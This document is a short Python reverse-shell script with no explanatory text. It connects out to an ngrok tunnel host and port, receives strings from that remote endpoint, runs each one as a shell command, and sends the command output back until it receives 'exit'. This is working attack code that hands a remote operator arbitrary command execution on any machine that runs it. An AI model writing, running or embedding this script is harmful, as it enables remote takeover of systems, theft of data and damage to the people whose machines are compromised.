import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[2.tcp.eu.ngrok.io]", 19787))
while True:
    data = s.recv(1024)
    if data.decode('utf-8') == "exit":
        break
    output = subprocess.run(data.decode('utf-8'), shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)
s.close()